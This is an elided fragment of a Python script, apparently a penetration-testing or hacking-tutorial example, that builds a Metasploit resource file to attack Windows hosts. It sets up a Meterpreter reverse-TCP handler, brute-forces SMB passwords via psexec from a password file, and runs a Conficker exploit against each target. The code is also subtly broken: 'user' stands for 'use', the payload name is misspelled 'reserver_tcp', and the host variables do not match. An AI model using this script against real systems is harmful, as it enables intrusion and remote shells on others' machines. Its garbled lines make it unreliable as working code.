...
def setupHandler(configFile, lhost, lport):
    configFile.write('user exploit/multi/handler\n')
    configFile.write('set PAYLOAD ' + 'windows/meterpreter/reserver_tcp\n')
...
def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    ...
    for password in pF.readlines():
        ...
        configFile.write('user exploit/windows/smb/psexec\n')
...
def main():
    ...
    tgtHost = findTgts(options.tgtHost)
    setupHandler(configFile, lhost, lport)

    for tgtHost in tgtHosts:
        confickerExploit(configFile, lhost, lport)
        if passwdFile != None:
